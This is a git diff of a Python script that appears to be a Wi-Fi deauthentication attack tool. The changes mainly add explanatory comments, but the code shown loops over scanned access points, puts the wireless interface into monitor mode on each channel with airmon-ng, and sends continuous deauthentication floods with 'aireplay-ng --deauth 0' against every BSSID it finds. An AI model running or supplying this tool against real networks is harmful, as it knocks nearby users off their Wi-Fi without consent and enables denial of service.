@@ -13,9 +13,9 @@ RED = "\033[31m"
 CYAN = "\033[36m"
 RESET = "\033[0m"  # Réinitialise la couleur
 
-wlan_pattern = re.compile("^wlan[0-9]+")
-wifi_name= ""
-active_wireless_networks = []
+wlan_pattern = re.compile("^wlan[0-9]+")    # Regex to find wlan interfaces
+wifi_name= ""                               # Essid of the wifi
+active_wireless_networks = []               # List of active wireless networks
 
 def check_csv():
     for file_name in os.listdir():
@@ -38,8 +38,8 @@ def check_csv():
 def start_deauth(wlan_interface, network_id):
     processes = []
     channel = ""
-    network_id.sort(key=lambda x: int(x[1]))
-    print(network_id)
+    network_id.sort(key=lambda x: int(x[1]))   # List of bssid sorted by channel
+    # print(network_id)
     try:
         if network_id == []:
             print("No wifi detected.")
@@ -47,16 +47,16 @@ def start_deauth(wlan_interface, network_id):
         while True:
             for a in network_id:
                 if channel != a[1]:
-                    #time.sleep(2)
+                    # Restart the wlan interface on monitor mode on a new channel
                     channel = a[1] 
-                    subprocess.run(["airmon-ng", "start", wlan_interface, channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Starting monitor mode on specific channel
+                    subprocess.run(["airmon-ng", "start", wlan_interface, channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 process = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", a[0], wlan_interface],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        # Start deauth 
                 processes.append(process)
                 print("Deauth ", a[0], " on the channel ", a[1])
-                #time.sleep(0.5)
         
 
     except KeyboardInterrupt:
+        # Kill all processes running in background
         for process in processes:
             process.terminate()
         print("End of the attack.\n")
@@ -79,7 +79,7 @@ def check_for_bssid(bssid, lst):
 
 def scan(wlan_interface):
 
-    network_id =[]
+    network_id =[]      # List of bssid and channel
 
     check_csv()
 
